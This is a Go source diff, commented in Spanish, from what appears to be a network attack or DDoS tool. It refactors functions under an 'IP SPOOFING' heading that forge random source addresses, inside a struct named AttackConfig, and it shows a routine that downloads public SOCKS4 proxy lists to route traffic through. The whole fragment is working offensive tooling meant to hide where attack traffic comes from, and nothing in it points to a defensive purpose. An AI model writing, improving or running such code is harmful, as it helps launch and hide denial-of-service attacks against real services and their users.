@@ -4,11 +4,9 @@ import (
 	"bufio"
 	"context"
 	"crypto/rand"
-	mrand "math/rand"
 	"encoding/binary"
 	"flag"
 	"fmt"
-	"log"
 	"net"
 	"net/http"
 	"net/url"
@@ -85,6 +83,13 @@ type AttackConfig struct {
 
 // ==================== IP SPOOFING ====================
 
+// generateRandomByte genera un byte aleatorio
+func generateRandomByte() byte {
+	b := make([]byte, 1)
+	rand.Read(b)
+	return b[0]
+}
+
 // generateSpoofedIP genera una IP falsificada
 func generateSpoofedIP() net.IP {
 	if config.spoofRange != "" {
@@ -99,10 +104,10 @@ func generateSpoofedIP() net.IP {
 	rand.Read(ip)
 	
 	// Evitar IPs especiales
-	ip[0] = byte(10) // Redes 10.x.x.x
-	ip[1] = byte(rand.Intn(255))
-	ip[2] = byte(rand.Intn(255))
-	ip[3] = byte(rand.Intn(254)) + 1 // Evitar .0 y .255
+	ip[0] = 10 // Redes 10.x.x.x
+	ip[1] = generateRandomByte()
+	ip[2] = generateRandomByte()
+	ip[3] = generateRandomByte()%253 + 1 // Evitar .0 y .255
 	
 	return net.IP(ip)
 }
@@ -121,7 +126,9 @@ func generateIPFromRange(cidr string) net.IP {
 	baseIP := binary.BigEndian.Uint32(ipnet.IP.To4())
 	
 	// Generar offset aleatorio
-	offset := uint32(rand.Intn(size-2)) + 1 // Evitar primera y última
+	offsetBytes := make([]byte, 4)
+	rand.Read(offsetBytes)
+	offset := uint32(offsetBytes[0])%uint32(size-2) + 1 // Evitar primera y última
 	
 	// Calcular IP
 	ipInt := baseIP + offset
@@ -205,7 +212,7 @@ func downloadProxies() error {
 	proxyList = []string{}
 	
 	proxySources := []struct {
-		url     string
+		url       string
 		proxyType string
 	}{
 		{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", "socks4"},
